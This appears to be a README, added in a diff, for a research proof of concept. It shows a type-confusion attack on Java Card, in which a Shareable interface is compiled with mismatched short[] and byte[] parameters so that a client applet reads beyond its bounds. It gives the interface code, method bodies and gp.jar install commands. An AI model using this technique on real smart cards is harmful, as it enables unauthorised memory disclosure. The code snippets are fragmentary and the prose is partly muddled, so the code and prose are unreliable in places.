@@ -1,0 +1,64 @@
+============================================================================================================================================
+AIM
+
+The aim is to exploit the type confusion arising between two sharing applets: ServerApplet and ClientApplet. The attack is implemented by carrying out a legitimate compilation/conversion into CAP file for the ServerApplet and illegitimate compilation of the ServerApplet for generating the CAP file for the ClientApplet in order to exploit the type confusion.
+
+============================================================================================================================================
+METHODOLOGY
+
+Declare two methods with same name but with different parameters in Shareable Interface MSI. 
+
+    /* Use this method declaration while compiling for ServerApplet Code */
+    public interface MSI extends Shareable {
+    
+        public short typeConfusion(short[] buffer); 
+    }
+
+    /* Use this method declaration while compiling for ClientApplet Code */
+    public interface MSI extends Shareable {
+
+        public short typeConfusion(byte[] buffer); 
+    }  
+
+Define these two methods in ServerApplet as given below. The method for ServerApplet compilation takes a short array as parameter while for CleintApplet takes a byte array as parameter. On invoking from ClientArray, the ServerArray returns twice the numebr of bytes than what was requested for.
+
+    /* Use this method while Compiling for ServerApplet Code */
+    /*public short typeConfusion(short[] buffer) {  
+        short shortValue = buffer[bufferOffset];
+        return shortValue;
+    }*/
+    
+    /* Use this method while Compiling for ClientApplet Code */
+    public short typeConfusion(byte[] buffer) {      
+        short shortValue = buffer[bufferOffset];
+        return shortValue;
+    }
+============================================================================================================================================
+
+INSTALL
+
+Project has two packages: packageA containing MSI and ServerApplet and packageB containing ClientApplet. One more package for communication with Java Card is also implemented.
+
+Compile ServerApplet, convert it into CAP file using the method for ServerApplet. Install the server.cap into Java Card.
+
+> ant server
+
+> java -jar gp.jar -install Shareable/output/server.cap -d
+
+Compile ServerApplet again with method specified for ClientApplet. Use this CAP and export file to compile and convert ClientApplet into CAP file.
+
+> ant server
+
+> ant client
+
+> java -jar gp.jar -install Shareable/output/client.cap -d
+
+===========================================================
+
+UNINSTALL
+
+> java -jar gp.jar -uninstall Shareable/output/client.cap -d
+
+> java -jar gp.jar -uninstall Shareable/output/server.cap -d
+
+=============================================================================================================================================
